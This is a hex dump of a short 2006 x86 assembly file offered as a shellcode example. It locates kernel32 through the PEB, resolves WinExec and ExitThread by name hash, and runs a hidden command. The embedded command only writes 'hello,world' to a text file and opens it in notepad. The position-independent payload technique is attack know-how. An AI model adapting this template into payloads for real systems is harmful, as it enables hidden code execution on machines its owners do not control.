00000000  3b 0d 0a 3b 20 72 65 6c  6f 63 61 74 65 61 62 6c  |;..; relocateabl|
00000010  65 20 64 79 6e 61 6d 69  63 20 72 75 6e 74 69 6d  |e dynamic runtim|
00000020  65 20 61 73 73 65 6d 62  6c 79 20 63 6f 64 65 20  |e assembly code |
00000030  65 78 61 6d 70 6c 65 20  75 73 69 6e 67 20 68 61  |example using ha|
00000040  73 68 20 6c 6f 6f 6b 75  70 0d 0a 3b 0d 0a 3b 20  |sh lookup..;..; |
00000050  57 69 6e 45 78 65 63 28  29 20 77 69 74 68 20 45  |WinExec() with E|
00000060  78 69 74 54 68 72 65 61  64 28 29 0d 0a 3b 20 31  |xitThread()..; 1|
00000070  30 34 20 62 79 74 65 73  0d 0a 3b 0d 0a 3b 20 66  |04 bytes..;..; f|
00000080  6f 72 20 74 65 73 74 69  6e 67 3a 0d 0a 3b 0d 0a  |or testing:..;..|
00000090  3b 20 6d 6c 20 2f 63 20  2f 63 6f 66 66 20 2f 43  |; ml /c /coff /C|
000000a0  70 20 77 65 78 65 63 32  2e 61 73 6d 0d 0a 3b 20  |p wexec2.asm..; |
000000b0  6c 69 6e 6b 20 2f 73 75  62 73 79 73 74 65 6d 3a  |link /subsystem:|
000000c0  77 69 6e 64 6f 77 73 20  2f 73 65 63 74 69 6f 6e  |windows /section|
000000d0  3a 2e 74 65 78 74 2c 77  20 77 65 78 65 63 32 2e  |:.text,w wexec2.|
000000e0  6f 62 6a 0d 0a 3b 0d 0a  3b 20 77 79 73 65 31 30  |obj..;..; wyse10|
000000f0  31 20 5b 61 74 5d 20 67  6d 61 69 6c 2e 63 6f 6d  |1 [at] gmail.com|
00000100  0d 0a 3b 0d 0a 3b 20 4f  63 74 6f 62 65 72 20 32  |..;..; October 2|
00000110  30 30 36 0d 0a 3b 0d 0a  2e 33 38 36 0d 0a 2e 6d  |006..;...386...m|
00000120  6f 64 65 6c 20 66 6c 61  74 2c 73 74 64 63 61 6c  |odel flat,stdcal|
00000130  6c 0d 0a 0d 0a 52 4f 4c  5f 43 4f 4e 53 54 41 4e  |l....ROL_CONSTAN|
00000140  54 20 65 71 75 20 35 0d  0a 0d 0a 6d 72 6f 6c 20  |T equ 5....mrol |
00000150  6d 61 63 72 6f 20 69 4e  75 6d 3a 72 65 71 2c 69  |macro iNum:req,i|
00000160  42 69 74 73 3a 72 65 71  0d 0a 20 20 20 65 78 69  |Bits:req..   exi|
00000170  74 6d 20 3c 28 69 4e 75  6d 20 73 68 6c 20 69 42  |tm <(iNum shl iB|
00000180  69 74 73 29 20 6f 72 20  28 69 4e 75 6d 20 73 68  |its) or (iNum sh|
00000190  72 20 28 33 32 2d 69 42  69 74 73 29 29 3e 0d 0a  |r (32-iBits))>..|
000001a0  65 6e 64 6d 0d 0a 0d 0a  6d 72 6f 72 20 6d 61 63  |endm....mror mac|
000001b0  72 6f 20 69 4e 75 6d 3a  72 65 71 2c 69 42 69 74  |ro iNum:req,iBit|
000001c0  73 3a 72 65 71 0d 0a 20  20 20 65 78 69 74 6d 20  |s:req..   exitm |
000001d0  3c 28 69 4e 75 6d 20 73  68 72 20 69 42 69 74 73  |<(iNum shr iBits|
000001e0  29 20 6f 72 20 28 69 4e  75 6d 20 73 68 6c 20 28  |) or (iNum shl (|
000001f0  33 32 2d 69 42 69 74 73  29 29 3e 0d 0a 65 6e 64  |32-iBits))>..end|
00000200  6d 0d 0a 0d 0a 68 61 73  68 61 70 69 20 6d 61 63  |m....hashapi mac|
00000210  72 6f 20 73 7a 41 70 69  0d 0a 20 20 20 6c 6f 63  |ro szApi..   loc|
00000220  61 6c 20 64 77 41 70 69  0d 0a 0d 0a 20 20 20 64  |al dwApi....   d|
00000230  77 41 70 69 20 3d 20 30  0d 0a 0d 0a 20 20 20 66  |wApi = 0....   f|
00000240  6f 72 63 20 78 2c 73 7a  41 70 69 0d 0a 20 20 20  |orc x,szApi..   |
00000250  20 20 20 64 77 41 70 69  20 3d 20 64 77 41 70 69  |   dwApi = dwApi|
00000260  20 2b 20 27 26 78 27 0d  0a 20 20 20 20 20 20 64  | + '&x'..      d|
00000270  77 41 70 69 20 3d 20 6d  72 6f 6c 28 64 77 41 70  |wApi = mrol(dwAp|
00000280  69 2c 52 4f 4c 5f 43 4f  4e 53 54 41 4e 54 29 0d  |i,ROL_CONSTANT).|
00000290  0a 20 20 20 65 6e 64 6d  0d 0a 20 20 20 64 77 41  |.   endm..   dwA|
000002a0  70 69 20 3d 20 6d 72 6f  6c 28 64 77 41 70 69 2c  |pi = mrol(dwApi,|
000002b0  52 4f 4c 5f 43 4f 4e 53  54 41 4e 54 29 0d 0a 20  |ROL_CONSTANT).. |
000002c0  20 20 64 77 20 28 64 77  41 70 69 20 61 6e 64 20  |  dw (dwApi and |
000002d0  30 66 66 66 66 68 29 0d  0a 65 6e 64 6d 0d 0a 0d  |0ffffh)..endm...|
000002e0  0a 2e 63 6f 64 65 0d 0a  0d 0a 20 20 20 61 73 73  |..code....   ass|
000002f0  75 6d 65 20 66 73 3a 6e  6f 74 68 69 6e 67 0d 0a  |ume fs:nothing..|
00000300  0d 0a 63 6f 64 65 5f 73  74 61 72 74 3a 0d 0a 20  |..code_start:.. |
00000310  20 20 6a 6d 70 20 6c 6f  61 64 5f 64 61 74 61 0d  |  jmp load_data.|
00000320  0a 73 65 74 75 70 5f 70  61 72 61 6d 65 74 65 72  |.setup_parameter|
00000330  73 3a 0d 0a 20 20 20 70  6f 70 20 65 62 70 0d 0a  |s:..   pop ebp..|
00000340  20 20 20 78 6f 72 20 65  63 78 2c 65 63 78 0d 0a  |   xor ecx,ecx..|
00000350  20 20 20 70 75 73 68 20  65 63 78 20 20 20 20 20  |   push ecx     |
00000360  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000370  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 45 78  |            ; Ex|
00000380  69 74 54 68 72 65 61 64  28 29 20 65 78 69 74 63  |itThread() exitc|
00000390  6f 64 65 0d 0a 20 20 20  70 75 73 68 20 65 63 78  |ode..   push ecx|
000003a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000003c0  20 3b 20 53 57 5f 48 49  44 45 0d 0a 20 20 20 6d  | ; SW_HIDE..   m|
000003d0  6f 76 20 63 6c 2c 28 63  6d 64 5f 65 6e 64 2d 61  |ov cl,(cmd_end-a|
000003e0  70 69 5f 68 61 73 68 65  73 29 20 20 20 20 20 20  |pi_hashes)      |
000003f0  20 20 20 20 20 20 20 20  3b 20 6c 69 6d 69 74 20  |        ; limit |
00000400  6f 66 20 32 35 35 20 62  79 74 65 73 20 70 65 72  |of 255 bytes per|
00000410  20 63 6f 6d 6d 61 6e 64  0d 0a 20 20 20 69 6e 63  | command..   inc|
00000420  20 62 79 74 65 20 70 74  72 5b 65 62 70 2b 65 63  | byte ptr[ebp+ec|
00000430  78 5d 0d 0a 20 20 20 6c  65 61 20 65 61 78 2c 5b  |x]..   lea eax,[|
00000440  65 62 70 2b 28 63 6d 64  5f 73 74 72 69 6e 67 2d  |ebp+(cmd_string-|
00000450  61 70 69 5f 68 61 73 68  65 73 29 5d 0d 0a 20 20  |api_hashes)]..  |
00000460  20 70 75 73 68 20 65 61  78 20 20 20 20 20 20 20  | push eax       |
00000470  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000480  20 20 20 20 20 20 20 20  20 20 3b 20 57 69 6e 45  |          ; WinE|
00000490  78 65 63 20 63 6f 6d 6d  61 6e 64 20 73 74 72 69  |xec command stri|
000004a0  6e 67 0d 0a 67 65 74 5f  6b 33 32 5f 62 61 73 65  |ng..get_k32_base|
000004b0  3a 0d 0a 20 20 20 6d 6f  76 20 63 6c 2c 33 30 68  |:..   mov cl,30h|
000004c0  0d 0a 20 20 20 6d 6f 76  20 65 61 78 2c 66 73 3a  |..   mov eax,fs:|
000004d0  5b 65 63 78 5d 0d 0a 20  20 20 6d 6f 76 20 65 61  |[ecx]..   mov ea|
000004e0  78 2c 5b 65 61 78 2b 30  63 68 5d 0d 0a 20 20 20  |x,[eax+0ch]..   |
000004f0  6d 6f 76 20 65 73 69 2c  5b 65 61 78 2b 31 63 68  |mov esi,[eax+1ch|
00000500  5d 0d 0a 20 20 20 6c 6f  64 73 64 0d 0a 20 20 20  |]..   lodsd..   |
00000510  6d 6f 76 20 65 62 78 2c  5b 65 61 78 2b 30 38 68  |mov ebx,[eax+08h|
00000520  5d 0d 0a 67 65 74 5f 61  70 69 5f 6c 6f 6f 70 3a  |]..get_api_loop:|
00000530  0d 0a 20 20 20 6d 6f 76  20 65 61 78 2c 5b 65 62  |..   mov eax,[eb|
00000540  78 2b 33 63 68 5d 0d 0a  20 20 20 6d 6f 76 20 65  |x+3ch]..   mov e|
00000550  61 78 2c 5b 65 62 78 2b  65 61 78 2b 37 38 68 5d  |ax,[ebx+eax+78h]|
00000560  0d 0a 20 20 20 6c 65 61  20 65 73 69 2c 5b 65 62  |..   lea esi,[eb|
00000570  78 2b 65 61 78 2b 31 63  68 5d 0d 0a 20 20 20 6d  |x+eax+1ch]..   m|
00000580  6f 76 20 63 6c 2c 33 0d  0a 6c 6f 61 64 5f 72 76  |ov cl,3..load_rv|
00000590  61 3a 0d 0a 20 20 20 6c  6f 64 73 64 0d 0a 20 20  |a:..   lodsd..  |
000005a0  20 61 64 64 20 65 61 78  2c 65 62 78 0d 0a 20 20  | add eax,ebx..  |
000005b0  20 70 75 73 68 20 65 61  78 0d 0a 20 20 20 6c 6f  | push eax..   lo|
000005c0  6f 70 20 6c 6f 61 64 5f  72 76 61 0d 0a 20 20 20  |op load_rva..   |
000005d0  70 6f 70 20 65 62 70 0d  0a 20 20 20 70 6f 70 20  |pop ebp..   pop |
000005e0  65 64 69 0d 0a 6c 6f 61  64 5f 61 70 69 3a 0d 0a  |edi..load_api:..|
000005f0  20 20 20 6d 6f 76 20 65  73 69 2c 5b 65 64 69 2b  |   mov esi,[edi+|
00000600  34 2a 65 63 78 5d 0d 0a  20 20 20 61 64 64 20 65  |4*ecx]..   add e|
00000610  73 69 2c 65 62 78 0d 0a  20 20 20 78 6f 72 20 65  |si,ebx..   xor e|
00000620  61 78 2c 65 61 78 0d 0a  20 20 20 63 64 71 0d 0a  |ax,eax..   cdq..|
00000630  68 61 73 68 5f 61 70 69  3a 0d 0a 20 20 20 6c 6f  |hash_api:..   lo|
00000640  64 73 62 0d 0a 20 20 20  61 64 64 20 65 64 78 2c  |dsb..   add edx,|
00000650  65 61 78 0d 0a 20 20 20  72 6f 6c 20 65 64 78 2c  |eax..   rol edx,|
00000660  52 4f 4c 5f 43 4f 4e 53  54 41 4e 54 0d 0a 20 20  |ROL_CONSTANT..  |
00000670  20 64 65 63 20 65 61 78  0d 0a 20 20 20 6a 6e 73  | dec eax..   jns|
00000680  20 68 61 73 68 5f 61 70  69 0d 0a 20 20 20 69 6e  | hash_api..   in|
00000690  63 20 65 63 78 0d 0a 20  20 20 6d 6f 76 20 65 61  |c ecx..   mov ea|
000006a0  78 2c 5b 65 73 70 2b 34  5d 0d 0a 20 20 20 63 6d  |x,[esp+4]..   cm|
000006b0  70 20 64 78 2c 77 6f 72  64 20 70 74 72 5b 65 61  |p dx,word ptr[ea|
000006c0  78 5d 0d 0a 20 20 20 6a  6e 65 20 6c 6f 61 64 5f  |x]..   jne load_|
000006d0  61 70 69 0d 0a 20 20 20  70 6f 70 20 65 61 78 0d  |api..   pop eax.|
000006e0  0a 20 20 20 6d 6f 76 7a  78 20 65 64 78 2c 77 6f  |.   movzx edx,wo|
000006f0  72 64 20 70 74 72 5b 65  62 70 2b 32 2a 65 63 78  |rd ptr[ebp+2*ecx|
00000700  2d 32 5d 0d 0a 20 20 20  61 64 64 20 65 62 78 2c  |-2]..   add ebx,|
00000710  5b 65 61 78 2b 34 2a 65  64 78 5d 0d 0a 20 20 20  |[eax+4*edx]..   |
00000720  70 6f 70 20 65 73 69 0d  0a 20 20 20 63 61 6c 6c  |pop esi..   call|
00000730  20 65 62 78 0d 0a 20 20  20 6c 6f 64 73 77 0d 0a  | ebx..   lodsw..|
00000740  20 20 20 6a 6d 70 20 67  65 74 5f 6b 33 32 5f 62  |   jmp get_k32_b|
00000750  61 73 65 0d 0a 6c 6f 61  64 5f 64 61 74 61 3a 0d  |ase..load_data:.|
00000760  0a 20 20 20 63 61 6c 6c  20 73 65 74 75 70 5f 70  |.   call setup_p|
00000770  61 72 61 6d 65 74 65 72  73 0d 0a 61 70 69 5f 68  |arameters..api_h|
00000780  61 73 68 65 73 3a 0d 0a  20 20 20 68 61 73 68 61  |ashes:..   hasha|
00000790  70 69 20 3c 57 69 6e 45  78 65 63 3e 0d 0a 20 20  |pi <WinExec>..  |
000007a0  20 68 61 73 68 61 70 69  20 3c 45 78 69 74 54 68  | hashapi <ExitTh|
000007b0  72 65 61 64 3e 0d 0a 63  6f 64 65 5f 65 6e 64 3a  |read>..code_end:|
000007c0  0d 0a 0d 0a 63 6d 64 5f  73 74 72 69 6e 67 20 64  |....cmd_string d|
000007d0  62 20 27 63 6d 64 20 2f  63 20 65 63 68 6f 20 68  |b 'cmd /c echo h|
000007e0  65 6c 6c 6f 2c 77 6f 72  6c 64 3e 74 65 73 74 2e  |ello,world>test.|
000007f0  74 78 74 20 26 26 20 6e  6f 74 65 70 61 64 20 74  |txt && notepad t|
00000800  65 73 74 2e 74 78 74 27  2c 30 66 66 68 0d 0a 63  |est.txt',0ffh..c|
00000810  6d 64 5f 65 6e 64 20 65  71 75 20 24 2d 31 0d 0a  |md_end equ $-1..|
00000820  0d 0a 65 6e 64 20 63 6f  64 65 5f 73 74 61 72 74  |..end code_start|
00000830
